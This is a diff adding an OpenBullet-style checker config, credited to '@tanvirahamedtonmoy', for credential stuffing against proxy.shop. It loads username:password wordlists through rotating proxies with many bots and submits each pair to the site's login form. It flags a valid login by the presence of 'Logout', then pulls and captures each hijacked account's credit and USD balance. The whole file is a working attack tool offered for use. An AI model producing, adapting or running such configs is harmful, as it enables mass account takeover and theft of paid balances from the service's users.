@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "Proxy.shop BY @tanvirahamedtonmoy",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-15T18:08:04.2167451+06:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 @tanvirahamedtonmoy 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Constant "<USER>" -> VAR "USER" 
+
+FUNCTION Constant "<PASS>" -> VAR "PASS" 
+
+REQUEST GET "https://proxy.shop/users/login" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 48" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://proxy.shop" 
+  HEADER "referer: https://proxy.shop/users/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36" 
+
+PARSE "<COOKIES(session)>" LR "" "" -> VAR "COOKIE" 
+
+REQUEST POST "https://proxy.shop/users/login" 
+  CONTENT "username=<USER>&password=<PASS>&key=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Origin: https://proxy.shop" 
+  HEADER "Referer: https://proxy.shop/users/login" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "TE: trailersuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" EqualTo "Username or password is invalid" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+
+REQUEST GET "https://proxy.shop/api/balance" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "credits" CreateEmpty=FALSE -> CAP "CREDITS" 
+
+PARSE "<SOURCE>" JSON "usd" CreateEmpty=FALSE -> CAP "USD" 
+
+FUNCTION Constant "🔥@tanvirahamedtonmoy🔥" -> CAP "Config BY" 
+
